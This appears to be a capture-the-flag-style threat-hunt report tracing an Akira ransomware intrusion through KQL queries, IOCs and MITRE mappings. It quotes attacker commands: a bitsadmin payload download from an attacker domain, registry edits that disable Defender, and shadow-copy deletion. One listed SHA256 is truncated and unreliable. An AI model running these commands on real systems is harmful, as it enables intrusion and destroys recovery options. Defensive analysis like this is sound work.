# 🔍 Threat Hunt Report: The Buyer, Ransomware Incident Response

**Analyst:** Chukwuebuka Okorie | SOC Analyst L1, Log'n Pacific

**Date:** March 2026

**Classification:** CONFIDENTIAL

**Environment:** Azure-hosted Windows domain (AS-PC1, AS-PC2, AS-SRV)

**Tools Used:** Microsoft Defender for Endpoint (MDE), Microsoft Sentinel (Log Analytics), KQL

<img width="1024" height="1536" alt="Image" src="https://github.com/user-attachments/assets/603670d2-67ba-447e-8652-3855a291b7dc" />


**Scenario Context:** This investigation follows on from my earlier work on "The Broker" case. The same threat actor came back to the environment using access they had already set up during that first intrusion. This time they deployed Akira ransomware across the network. The challenge here was harder than The Broker because I had to work backwards from the impact, track activity across multiple hosts, and connect the dots with infrastructure I had already flagged in the first investigation.

---

## 📋 Executive Summary

This report covers my investigation into a ransomware incident at Ashford Sterling Recruitment. The attack was a return visit by the same threat actor from The Broker investigation. They used the AnyDesk backdoor they had already planted to get back into the network and deploy Akira ransomware.

The attacker connected via AnyDesk from external IP 88.97.164.155 to AS-PC2 under the compromised david.mitchell account. From there they deployed a new C2 beacon called wsync.exe, ran Advanced IP Scanner for network reconnaissance, dumped credentials from LSASS memory, moved laterally to AS-SRV using the as.srv.administrator account, exfiltrated data using st.exe, and then deployed Akira ransomware disguised as updater.exe. Along the way they disabled Windows Defender using kill.bat, deleted volume shadow copies to prevent recovery, and cleaned up the ransomware binary with clean.bat after encryption was done.

**Key Findings:**
- 🚪 Re-entry via pre-staged AnyDesk backdoor left over from The Broker (C:\Users\Public\)
- 📡 New C2 beacon wsync.exe deployed to C:\ProgramData\ (the first version failed so a replacement was pushed)
- 🛡️ Defender disabled via kill.bat targeting three registry values
- 🔑 LSASS credential theft via named pipe access
- 📤 Data exfiltration before encryption, following the double extortion model
- 🔒 Akira ransomware (updater.exe) deployed on AS-SRV
- 🧹 Anti-forensics using clean.bat to remove the ransomware binary and vssadmin to delete shadow copies
- 🖥️ Scope limited to AS-PC2 and AS-SRV

---

## 🏗️ Environment Overview

| Host | Role | Key Users |
|------|------|-----------|
| AS-PC1 | Workstation (Initial Compromise in The Broker) | sophie.turner |
| AS-PC2 | Workstation (Re-entry point in The Buyer) | david.mitchell |
| AS-SRV | Domain Server / File Server | as.srv.administrator |

---

## 📅 Attack Timeline Overview

The attack started on January 27, 2026 at around 20:13 UTC when the attacker connected to AS-PC2 via the AnyDesk backdoor using the david.mitchell account from external IP 88.97.164.155.

Within the first few minutes they used bitsadmin to download scan.exe from sync.cloud-endpoint.net at 20:14 UTC. After a few failed attempts to save it to different directories, they got it into David Mitchell's Downloads folder and executed it at 20:17 UTC. This turned out to be a self-extracting archive containing Advanced IP Scanner, which they ran in portable mode to sweep the internal network.

At 20:22 UTC they downloaded the first version of their C2 beacon, wsync.exe, to C:\ProgramData\ via PowerShell. This version failed to establish stable communications so they replaced it with a second version at 20:44 UTC.

Once the beacon was working, wsync.exe dropped kill.bat at 20:54 UTC which was then executed at 21:02 UTC. Between 21:03:39 and 21:03:42 UTC, kill.bat ran three registry modifications to disable Windows Defender. It set DisableBehaviorMonitoring, DisableIOAVProtection, and DisableAntiSpyware all to 1.

With Defender out of the way, the attacker started hunting for LSASS. They ran tasklist | findstr lsass twice on AS-PC2, first at 21:11 UTC and again at 21:14 UTC. At 21:42 UTC they accessed the \Device\NamedPipe\lsass pipe to dump credentials from LSASS memory. This gave them the as.srv.administrator credentials they needed for lateral movement.

The attacker then moved to AS-SRV using the stolen admin credentials. At 22:18:33 UTC, updater.exe (the Akira ransomware binary) began dropping akira_readme.txt files across multiple directories on AS-SRV, marking the start of encryption. At 22:24 UTC, st.exe created exfil_data.zip at C:\Users\Public\ on AS-SRV to exfiltrate stolen data.

The encryption continued over the next several hours. By 02:51 UTC on January 28, .akira encrypted file extensions were visible across the file server. After encryption completed, clean.bat was run to delete the updater.exe binary from disk as an anti-forensics measure.

---

## 🔬 Detailed Findings

---

### SECTION 1: RANSOM NOTE ANALYSIS 📝

---

#### Q1 — Threat Actor

**❓ Question:** What ransomware group is responsible?

**✅ Answer:** `Akira`

**🔎 How it was found:** I identified this directly from the ransom note (akira_readme) found on the file server. The note opens with "Hi, We are Akira" and is signed by "Akira Team."

**📝 Analysis:**
The ransom note follows the standard Akira ransomware template. It includes double extortion threats where they threaten both encryption and data leaking, a TOR negotiation portal, and a unique victim ID. Akira is a well-known ransomware-as-a-service group active since early 2023 that tends to target small-to-medium enterprises. The example negotiation chat showed an initial demand of £65,000, which was later reduced to £11,000 after the victim pushed back.

<img width="2310" height="1213" alt="image" src="https://github.com/user-attachments/assets/427de9b6-e9f4-42a4-8954-bb2f150446f3" />


---

#### Q2 — TOR Negotiation Address

**❓ Question:** What is the TOR negotiation address?

**✅ Answer:** `akiral2iz6a7qgd3ayp3l6yub7xx2uep76idk3u2kollpj5z3z636bad.onion`

**🔎 How it was found:** Extracted directly from the ransom note under the "Contact / TOR Browser" section.

**📝 Analysis:**
The .onion address hosts Akira's negotiation portal called "Akira Secure Chat" where victims are directed to negotiate ransom payments.

<img width="922" height="166" alt="Image" src="https://github.com/user-attachments/assets/8fe4fa49-7b6d-4c60-b11e-bd8923948d08" />

---

#### Q3 — Victim ID

**❓ Question:** What is the company's unique ID?

**✅ Answer:** `813R-QWJM-XKIJ`

**🔎 How it was found:** Extracted from the ransom note under "Your personal ID."

**📝 Analysis:**
Each Akira victim receives a unique identifier used to track negotiations on the TOR portal. This ID links Ashford Sterling Recruitment to their specific encryption keys and negotiation thread.

<img width="898" height="146" alt="Image" src="https://github.com/user-attachments/assets/ef2c9232-15e4-4a45-a5fd-f659b49e8055" />

---

#### Q4 — Encrypted Extension

**❓ Question:** What file extension is added to encrypted files?

**✅ Answer:** `.akira`

**🔎 How it was found:** Stated in the ransom note: "Your files have been encrypted using AES-256 encryption. The extension .akira has been added to all affected files."

**📝 Analysis:**
Akira ransomware appends the .akira extension to all encrypted files. The note also states original files have been "securely deleted" which means recovery without the decryption key is not possible (MITRE T1486: Data Encrypted for Impact).

<img width="855" height="168" alt="Image" src="https://github.com/user-attachments/assets/2d43d871-3fb2-4383-93f6-f0f5adc182d3" />

---

### SECTION 2: INFRASTRUCTURE 🌐

---

#### Q5 — Payload Domain

**❓ Question:** What domain hosted the payloads?

**✅ Answer:** `sync.cloud-endpoint.net`

**🔎 How it was found:** KQL Query

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-01-07) .. datetime(2026-02-07))
| where DeviceName has "as-"
| where RemoteUrl !endswith ".microsoft.com" and RemoteUrl !endswith ".windows.com"
| where RemoteUrl != ""
| summarize ConnectionCount = count() by RemoteUrl, RemoteIP, DeviceName
| order by ConnectionCount desc
```

**📝 Analysis:**
This is the same payload staging domain from The Broker investigation being reused. I found sync.cloud-endpoint.net on AS-PC2 resolving to 172.67.174.46 and 104.21.30.237. During The Broker this domain was used to deliver RuntimeBroker.exe via certutil, so seeing it again confirmed the attacker reused their existing infrastructure for this return visit.


---

#### Q6 — Ransomware Staging Domain

**❓ Question:** What domain staged the ransomware?

**✅ Answer:** `cdn.cloud-endpoint.net`

**🔎 How it was found:** Same KQL query as Q5.

**📝 Analysis:**
The C2 domain from The Broker was repurposed for ransomware staging in this second intrusion. The attacker maintained segmented infrastructure under the same parent domain (cloud-endpoint.net) with sync for payload delivery and cdn for C2 and ransomware staging.


---

#### Q7 — C2 IP Addresses

**❓ Question:** What are the two C2 IP addresses?

**✅ Answer:** `104.21.30.237, 172.67.174.46`

**🔎 How it was found:** KQL Query

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-01-07) .. datetime(2026-02-07))
| where DeviceName has "as-"
| where RemoteUrl has "cloud-endpoint"
| project Timestamp, DeviceName, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp asc
```

**📝 Analysis:**
Both IPs are identical to what I found in The Broker investigation. They fall within Cloudflare's IP range which means the attacker is using Cloudflare as a reverse proxy for their C2 infrastructure. This is a common technique to hide the real origin server and blend C2 traffic with legitimate CDN traffic.


---

#### Q8 — Remote Tool Relay Domain

**❓ Question:** What is the remote tool relay domain?

**✅ Answer:** `relay-0b975d23.net.anydesk.com`

**🔎 How it was found:** KQL Query

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-01-07) .. datetime(2026-02-07))
| where DeviceName has "as-"
| where RemoteUrl has "anydesk"
| project Timestamp, DeviceName, RemoteUrl, RemoteIP
| order by Timestamp asc
```

**📝 Analysis:**
AnyDesk uses relay servers to broker connections between endpoints. This specific relay domain was used to route the attacker's AnyDesk sessions through AnyDesk's legitimate infrastructure. The persistence mechanism from The Broker (AnyDesk with password intrud3r!) was still active and served as the re-entry point for this ransomware deployment.


---

### SECTION 3: DEFENSE EVASION 🛡️

---

#### Q9 — Evasion Script

**❓ Question:** What script disabled security?

**✅ Answer:** `kill.bat`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-01-07) .. datetime(2026-02-07))
| where DeviceName has "as-"
| where ProcessCommandLine has_any ("Set-MpPreference", "DisableRealtimeMonitoring", "DisableBehaviorMonitoring", "Add-MpPreference", "-ExclusionPath", ".ps1", ".bat", ".cmd", "defender", "tamper")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessAccountName
| order by Timestamp asc
```

**📝 Analysis:**
I found kill.bat staged at C:\ProgramData\ on AS-PC2, executed by wsync.exe under the david.mitchell account at 21:02 UTC. The script systematically disabled Windows Defender protections via registry modifications before the ransomware was deployed. The fact that wsync.exe dropped and ran this script confirms it was the attack orchestrator.

<img width="1813" height="518" alt="Image" src="https://github.com/user-attachments/assets/f1409edb-eefd-4acd-b8fb-19161ee0eb54" />

---

#### Q10 — Evasion Hash

**❓ Question:** What is the SHA256 of the evasion script?

**✅ Answer:** `0e7da57d92eaa6bda9d0bbc24b5f0827250aa42f295fd056ded50c6e3c3fb96c`

**🔎 How it was found:** KQL Query

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-01-07) .. datetime(2026-02-07))
| where DeviceName has "as-"
| where FileName == "kill.bat"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, ActionType, InitiatingProcessFileName
| order by Timestamp asc
```

<img width="1694" height="720" alt="Image" src="https://github.com/user-attachments/assets/4d38042c-fd30-4dfa-a086-5b3361410895" />

---

#### Q11 — Registry Tampering

**❓ Question:** What registry value disabled Windows Defender?

**✅ Answer:** `DisableAntiSpyware`

**🔎 How it was found:** KQL Query

```kql
DeviceRegistryEvents
| where Timestamp between (datetime(2026-01-07) .. datetime(2026-02-07))
| where DeviceName has "as-"
| where RegistryKey has "Windows Defender" or RegistryKey has "Real-Time Protection"
| project Timestamp, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

**📝 Analysis:**
kill.bat executed three registry modifications in rapid succession via reg.exe on AS-PC2, all targeting HKLM\SOFTWARE\Policies\Microsoft\Windows Defender:

1. 21:03:39 UTC, DisableBehaviorMonitoring set to 1
2. 21:03:41 UTC, DisableIOAVProtection set to 1
3. 21:03:42 UTC, DisableAntiSpyware set to 1

Each used the command reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ValueName /t REG_DWORD /d 1 /f. This stripped Defender's real-time protection, behaviour monitoring, and IOAV protection all within 3 seconds (MITRE T1562.001: Impair Defenses).

<img width="1721" height="729" alt="Image" src="https://github.com/user-attachments/assets/411e14bb-8ed8-4ea6-9c35-719c2168449d" />

---

#### Q12 — Registry Timestamp

**❓ Question:** What time was the registry modified?

**✅ Answer:** `21:03:42` (UTC)

**🔎 How it was found:** Same KQL query as Q11. This was the timestamp for the DisableAntiSpyware modification which was the last of the three.

*[See in Q11 Evidence]*

---

### SECTION 4: CREDENTIAL ACCESS 🔑

---

#### Q13 — Process Hunt

**❓ Question:** What command was used to enumerate processes for credential theft?

**✅ Answer:** `tasklist | findstr lsass`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-01-07) .. datetime(2026-02-07))
| where DeviceName has "as-"
| where ProcessCommandLine has_any ("tasklist", "Get-Process", "ps ", "wmic process", "qprocess", "lsass")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessAccountName
| order by Timestamp asc
```

**📝 Analysis:**
The attacker ran cmd.exe /c "tasklist | findstr lsass" twice on AS-PC2, first at 21:11:00 and again at 21:14:43 UTC. Both times it was initiated by wsync.exe under david.mitchell. They were checking that the LSASS process was running before going ahead with credential dumping. The repeated execution suggests they wanted to be sure before committing to the next step (MITRE T1057: Process Discovery).

<img width="1718" height="615" alt="Image" src="https://github.com/user-attachments/assets/978856d2-c039-4ff2-ba8b-b2310bc2034f" />

---

#### Q14 — Credential Pipe

**❓ Question:** What named pipe was accessed during credential theft?

**✅ Answer:** `\Device\NamedPipe\lsass`

**🔎 How it was found:** KQL Query filtering NamedPipeEvents and excluding legitimate noise from Teams, Edge, crashpad, and other system processes.

```kql
DeviceEvents
| where Timestamp between (datetime(2026-01-27T20:00:00Z) .. datetime(2026-01-28T00:00:00Z))
| where DeviceName has "as-"
| where ActionType == "NamedPipeEvent"
| where InitiatingProcessFileName !in ("updater.exe", "ms-teams.exe", "msedgewebview2.exe", "svchost.exe", "backgroundtaskhost.exe", "firefox.exe", "crashhelper.exe", "phoneexperiencehost.exe", "searchapp.exe", "m365copilot.exe", "setup.exe")
| where AdditionalFields !has "crashpad" and AdditionalFields !has "Teams" and AdditionalFields !has "mojo" and AdditionalFields !has "dotnet-diagnostic" and AdditionalFields !has "TSVCPIPE" and AdditionalFields !has "gecko"
| project Timestamp, DeviceName, ActionType, AdditionalFields, FileName, InitiatingProcessFileName
| order by Timestamp asc
```

**📝 Analysis:**
The \Device\NamedPipe\lsass pipe was accessed on AS-PC2 at 21:42:56 UTC by a process with a blank FileName, which means the tool was trying to hide its identity. This lines up with the MDE alert showing powershell.exe read lsass.exe process memory (25,864 bytes copied, 201 reads). The attacker targeted LSASS to extract credentials from memory which gave them the as.srv.administrator account they needed for lateral movement (MITRE T1003.001: LSASS Memory).

<img width="1757" height="642" alt="Image" src="https://github.com/user-attachments/assets/b4c775d8-f0aa-4458-b5d8-4662386be51c" />

---

### SECTION 5: INITIAL ACCESS 🚪

---

#### Q15 — Remote Access Tool

**❓ Question:** What remote access tool was used?

**✅ Answer:** `anydesk`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-01-27T20:00:00Z) .. datetime(2026-01-28T00:00:00Z))
| where DeviceName == "as-pc2"
| where ProcessCommandLine has "anydesk" or FileName =~ "anydesk.exe"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessAccountName
| order by Timestamp asc
```

**📝 Analysis:**
The attacker re-entered the environment using the same AnyDesk installation that was pre-staged during The Broker intrusion. It still had unattended access configured with the password intrud3r!, which gave the attacker a persistent backdoor that survived between the two intrusions (MITRE T1219: Remote Access Software).

<img width="1733" height="667" alt="Image" src="https://github.com/user-attachments/assets/22b5e9db-b700-4ee9-b446-0c3c6f42fcbe" />

---

#### Q16 — Suspicious Execution Path

**❓ Question:** What directory was the remote access tool executed from?

**✅ Answer:** `C:\Users\Public\`

**🔎 How it was found:** Same KQL query as Q15. The FolderPath showed C:\Users\Public\AnyDesk.exe.

**📝 Analysis:**
Legitimate AnyDesk installations normally sit in C:\Program Files (x86)\AnyDesk\. Finding it running from C:\Users\Public\ is a strong indicator of malicious deployment since that is a world-writable directory commonly used by attackers for staging (MITRE T1036.005: Match Legitimate Name or Location).


---

#### Q17 — Attacker IP

**❓ Question:** What is the attacker's external IP address?

**✅ Answer:** `88.97.164.155`

**🔎 How it was found:** KQL Query

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-01-27T20:00:00Z) .. datetime(2026-01-28T00:00:00Z))
| where DeviceName == "as-pc2"
| where InitiatingProcessFileName =~ "anydesk.exe"
| where RemoteIP !startswith "10." and RemoteIP !startswith "172.16." and RemoteIP !startswith "192.168."
| project Timestamp, RemoteUrl, RemoteIP, RemotePort, LocalPort
| order by Timestamp asc
```

**📝 Analysis:**
The AnyDesk session originated from external IP 88.97.164.155. This represents the threat actor's operational infrastructure or VPN exit node.


---

#### Q18 — Compromised User

**❓ Question:** What user was compromised on AS-PC2?

**✅ Answer:** `david.mitchell`

**🔎 How it was found:** Same KQL query as Q15. The InitiatingProcessAccountName showed david.mitchell.

**📝 Analysis:**
The AnyDesk session was running under the david.mitchell account on AS-PC2. This is consistent with The Broker where david.mitchell's credentials were stolen and used for lateral movement. The attacker simply reused those same credentials to get back in via the AnyDesk backdoor.


---

### SECTION 6: COMMAND & CONTROL 📡

---

#### Q19 — Primary Beacon

**❓ Question:** What new C2 beacon was deployed?

**✅ Answer:** `wsync.exe`

**🔎 How it was found:** KQL Query

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:00:00Z) .. datetime(2026-01-28T03:00:00Z))
| where DeviceName == "as-pc2"
| where ActionType == "FileCreated"
| where FolderPath !has "Windows" and FolderPath !has "AppData"
| where FileName !endswith ".akira" and FileName !endswith ".tmp"
| project Timestamp, FileName, FolderPath, SHA256, InitiatingProcessFileName
| order by Timestamp asc
```

**📝 Analysis:**
wsync.exe was the primary orchestrator for the entire attack. It dropped kill.bat to disable Defender, executed tasklist | findstr lsass for process hunting, and coordinated the overall attack chain. The name mimics legitimate Windows sync utilities to blend in with normal processes.

<img width="1771" height="1147" alt="Image" src="https://github.com/user-attachments/assets/4965c125-26b5-415d-bcfc-f28cfb1e6b30" />

---

#### Q20 — Beacon Location

**❓ Question:** What directory was the new beacon deployed to?

**✅ Answer:** `C:\ProgramData\`

**📝 Analysis:**
The beacon was deployed to C:\ProgramData\, a hidden directory writable by all users. The attacker shifted from C:\Users\Public\ (used in The Broker for AnyDesk) to C:\ProgramData\ for this deployment, possibly to avoid detection in a directory that was already flagged.

*[See Q19 for Evidence: Beacon Location]*

---

#### Q21 — Beacon Hash (Original)

**❓ Question:** What is the SHA256 of the original beacon?

**✅ Answer:** `66b876c52946f4aed47dd696d790972ff265b6f4451dab54245bc4ef1206d90b`

**📝 Analysis:**
The first version of wsync.exe was downloaded via PowerShell at 20:22:50 UTC. This original beacon failed to maintain stable C2 communications which forced the attacker to deploy a replacement about 21 minutes later.

*[See Q19 for Evidence: Beacon Hash]*

---

#### Q22 — Beacon Creation (Replacement)

**❓ Question:** What is the SHA256 of the replacement beacon?

**✅ Answer:** `0072ca0d0adc9a1b2e1625db4409f57fc32b5a`

**🔎 How it was found:** KQL Query

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-01-07) .. datetime(2026-02-07))
| where DeviceName has "as-"
| where FileName == "wsync.exe"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, ActionType, InitiatingProcessFileName
| order by Timestamp asc
```

**📝 Analysis:**
The replacement was deployed at 20:44:07 UTC and this one successfully established C2 communications. It went on to orchestrate the rest of the attack including Defender disabling, credential theft, and ransomware deployment. The rapid replacement tells me this was a hands-on-keyboard operator who was actively troubleshooting during the intrusion.

<img width="1733" height="671" alt="Image" src="https://github.com/user-attachments/assets/6b6a83d6-753e-44d0-b354-33661e4a52fd" />

---

### SECTION 7: RECONNAISSANCE 🔭

---

#### Q23 — Scanner Tool

**❓ Question:** What scanner tool was used?

**✅ Answer:** `scan.exe`

**📝 Analysis:**
The attacker downloaded scan.exe from sync.cloud-endpoint.net using bitsadmin /transfer job1. They tried saving it to several directories (C:\Users\Public\, C:\Temp\, and finally C:\Users\david.mitchell\Downloads\) before it worked. The file turned out to be a self-extracting archive containing Advanced IP Scanner which they ran in portable mode.


---

#### Q24 — Scanner Hash

**❓ Question:** What is the SHA256 of the scanner tool?

**✅ Answer:** `26d5748ffe6bd95e3fee6ce184d388a1a681006dc23a0f08d53c083c593c193b`


---

#### Q25 — Scanner Execution

**❓ Question:** What arguments were passed to the scanner?

**✅ Answer:** `/portable "C:/Users/david.mitchell/Downloads/" /lng en_us`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-01-27T20:17:00Z) .. datetime(2026-01-28T03:00:00Z))
| where DeviceName has "as-"
| where ProcessCommandLine has_any ("advanced_ip", "scan.exe", "scan.tmp")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
```

**📝 Analysis:**
The execution chain went powershell.exe to scan.exe to scan.tmp to advanced_ip_scanner.exe with /portable and /lng en_us flags. The /portable flag means no installation, just run directly from the Downloads folder. Advanced IP Scanner then performed a full subnet sweep of the 10.1.0.0/24 and 10.1.1.0/24 ranges.


---

#### Q26 — Network Enumeration

**❓ Question:** What two internal IPs were enumerated?

**✅ Answer:** `10.1.0.183, 10.1.0.154`

**🔎 How it was found:** KQL Query

```kql
DeviceNetworkEvents
| where Timestamp between (datetime(2026-01-27T20:17:00Z) .. datetime(2026-01-27T20:30:00Z))
| where DeviceName == "as-pc2"
| where RemoteIP startswith "10."
| summarize ConnectionCount = count() by RemoteIP, InitiatingProcessFileName
| order by ConnectionCount desc
```

**📝 Analysis:**
After the broad subnet sweep, the attacker targeted shares on two specific internal hosts: 10.1.0.183 and 10.1.0.154, corresponding to AS-PC1 and AS-SRV.

<img width="1484" height="488" alt="Image" src="https://github.com/user-attachments/assets/0ea3ce0e-e171-4986-bf56-fb63cbd207dc" />

---

### SECTION 8: LATERAL MOVEMENT 🕸️

---

#### Q27 — Lateral Account

**❓ Question:** What account was used to authenticate to AS-SRV?

**✅ Answer:** `as.srv.administrator`

**🔎 How it was found:** KQL Query

```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-01-27T20:00:00Z) .. datetime(2026-01-28T03:00:00Z))
| where DeviceName == "as-srv"
| where LogonType in ("RemoteInteractive", "Network", "NewCredentials")
| project Timestamp, DeviceName, AccountName, LogonType, RemoteIP, ActionType
| order by Timestamp asc
```

**📝 Analysis:**
The attacker used the as.srv.administrator account which is a domain/server administrator account they obtained during the LSASS credential theft on AS-PC2. With server admin credentials they had full control over AS-SRV to deploy ransomware and access sensitive data.


---

### SECTION 9: TOOL TRANSFER 🔧

---

#### Q28 — Download Method

**❓ Question:** What LOLBIN was first used to download tools?

**✅ Answer:** `bitsadmin.exe`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-01-27T20:13:00Z) .. datetime(2026-01-27T20:18:00Z))
| where DeviceName == "as-pc2"
| where FileName == "bitsadmin.exe"
| project Timestamp, ProcessCommandLine
```

**📝 Analysis:**
The attacker used bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe to download the scanner. They had multiple failed attempts saving to different directories before it worked. BitsAdmin is a legitimate Windows tool for managing BITS transfers that attackers commonly abuse for file downloads (MITRE T1197: BITS Jobs). Interestingly, in The Broker the attacker used certutil.exe as their LOLBin of choice, so they switched tools this time round.


---

#### Q29 — Fallback Method

**❓ Question:** What PowerShell cmdlet was used as fallback?

**✅ Answer:** `Invoke-WebRequest`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-01-27T20:00:00Z) .. datetime(2026-01-28T03:00:00Z))
| where DeviceName == "as-pc2"
| where FileName == "powershell.exe"
| where ProcessCommandLine has_any ("Invoke-WebRequest", "wget", "curl", "DownloadFile", "DownloadString", "Start-BitsTransfer", "iwr", "Invoke-RestMethod")
| project Timestamp, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
```

**📝 Analysis:**
After bitsadmin had issues, the attacker switched to PowerShell's Invoke-WebRequest cmdlet to download wsync.exe. This shows they are adaptable and will quickly pivot to alternative methods when something does not work (MITRE T1105: Ingress Tool Transfer).


---

### SECTION 10: EXFILTRATION 📤

---

#### Q30 — Staging Tool

**❓ Question:** What staging tool compressed the data?

**✅ Answer:** `st.exe`

**🔎 How it was found:** KQL Query

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:00:00Z) .. datetime(2026-01-28T03:00:00Z))
| where DeviceName has "as-"
| where FileName has_any ("7z", "zip", "rar", ".7z", ".zip", ".rar")
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, ActionType, InitiatingProcessFileName
| order by Timestamp asc
```

**📝 Analysis:**
st.exe created exfil_data.zip at C:\Users\Public\ on AS-SRV at 22:24:09 UTC. This is the same exfiltration tool I saw in The Broker investigation, which confirms tool reuse across both intrusions.

<img width="1736" height="900" alt="Image" src="https://github.com/user-attachments/assets/99d57ec3-87d5-41f5-8d78-64cc52521b28" />

---

#### Q31 — Staging Hash

**❓ Question:** What is the SHA256 of the staging tool?

**✅ Answer:** `512a1f4ed9f512572608c729a2b89f44ea66a40433073aedcd914bd2d33b7015`

**🔎 How it was found:** KQL Query

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:00:00Z) .. datetime(2026-01-28T03:00:00Z))
| where DeviceName has "as-"
| where FileName == "st.exe"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256, ActionType, InitiatingProcessFileName
| order by Timestamp asc
```


---

#### Q32 — Exfil Archive

**❓ Question:** What archive was created for exfiltration?

**✅ Answer:** `exfil_data.zip`

**📝 Analysis:**
exfil_data.zip (SHA256: 082fb434ee2a2663343ab2d3088435cd49ceaf8168521ed7e0613ddb4ac90ec0) was created at 22:24:09 UTC on AS-SRV. This is consistent with Akira's double extortion model where data is stolen before encryption to use as leverage in ransom negotiations.

*[See Q30 for evidence]*

---

### SECTION 11: RANSOMWARE DEPLOYMENT 🔒

---

#### Q33 — Ransomware Filename

**❓ Question:** What is the ransomware filename?

**✅ Answer:** `updater.exe`

**🔎 How it was found:** KQL Query

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T22:00:00Z) .. datetime(2026-01-28T04:00:00Z))
| where DeviceName has "as-"
| where FileName has "akira"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessFileName
| order by Timestamp asc
```

**📝 Analysis:**
The Akira ransomware binary was disguised as updater.exe to look like a legitimate Windows update process (MITRE T1036.005: Match Legitimate Name or Location). I found it by looking at what process created the akira_readme.txt files. It dropped the ransom note across multiple directories on AS-SRV including Desktop, Documents, and Downloads.

<img width="1516" height="672" alt="Image" src="https://github.com/user-attachments/assets/6d499451-f9be-49ba-984e-80b8b328043a" />

---

#### Q34 — Ransomware Hash

**❓ Question:** What is the SHA256 of the ransomware?

**✅ Answer:** `e609d070ee9f76934d73353be4ef7ff34b3ecc3a2d1e5d052140ed4cb9e4752b`

**🔎 How it was found:** KQL Query

```kql
DeviceFileEvents
| where Timestamp between (datetime(2026-01-27T20:00:00Z) .. datetime(2026-01-28T03:00:00Z))
| where DeviceName == "as-srv"
| where FileName == "updater.exe"
| project Timestamp, FileName, FolderPath, SHA256, ActionType, InitiatingProcessFileName
| order by Timestamp asc
```

<img width="1721" height="712" alt="Image" src="https://github.com/user-attachments/assets/337166de-1894-426f-880a-01c6db9bc3bb" />

---

#### Q35 — Ransomware Staging

**❓ Question:** What process staged the ransomware on AS-SRV?

**✅ Answer:** `powershell.exe`

**📝 Analysis:**
PowerShell was used to transfer updater.exe onto AS-SRV, consistent with the attacker's pattern of using PowerShell as their primary tool transfer method after the initial bitsadmin issues (MITRE T1105: Ingress Tool Transfer).

*[See Q34 for evidence]*

---

#### Q36 — Recovery Prevention

**❓ Question:** What command was used to prevent recovery?

**✅ Answer:** `vssadmin delete shadows /all /quiet`

**🔎 How it was found:** KQL Query

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-01-27T20:00:00Z) .. datetime(2026-01-28T03:00:00Z))
| where DeviceName has "as-"
| where ProcessCommandLine has_any ("shadow", "vssadmin", "wmic shadow", "bcdedit", "wbadmin")
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
```

**📝 Analysis:**
The attacker deleted all Volume Shadow Copies to prevent file recovery (MITRE T1490: Inhibit System Recovery). The /all flag removes every shadow copy on the system and /quiet suppresses any confirmation prompts. This was executed before encryption to make sure victims could not restore files from VSS snapshots.

<img width="1555" height="608" alt="Image" src="https://github.com/user-attachments/assets/f63efcdc-7933-4d98-a843-39d27fb17bdc" />

---

#### Q37 — Ransom Note Origin

**❓ Question:** What process dropped the ransom note?

**✅ Answer:** `updater.exe`

**📝 Analysis:**
updater.exe dropped akira_readme.txt across Desktop, Documents, and Downloads folders under the AS.SRV.Administrator profile on AS-SRV.

*[See Q33 for evidence]*

---

#### Q38 — Encryption Start

**❓ Question:** What time was the ransom note dropped?

**✅ Answer:** `22:18:33` (UTC)

**📝 Analysis:**
The first akira_readme.txt was created at 22:18:33 UTC on January 27, 2026 on AS-SRV. This marks the start of the encryption phase. The .akira encrypted file extensions started appearing in link files from 02:51 UTC on January 28, which means encryption continued for several hours across the file server.

*[See Q33 for evidence]*

---

### SECTION 12: ANTI-FORENSICS & SCOPE 🧹

---

#### Q39 — Cleanup Script

**❓ Question:** What script deleted the ransomware?

**✅ Answer:** `clean.bat`

**📝 Analysis:**
After encryption completed, clean.bat was executed to delete the updater.exe binary from disk (MITRE T1070.004: Indicator Removal, File Deletion). This paired with kill.bat means the attacker used two batch scripts to bookend the ransomware deployment. kill.bat prepared the environment by disabling Defender, and clean.bat cleaned up afterwards by removing the ransomware binary.


---

#### Q40 — Affected Hosts

**❓ Question:** What hosts were compromised?

**✅ Answer:** `AS-PC2, AS-SRV`

**📝 Analysis:**
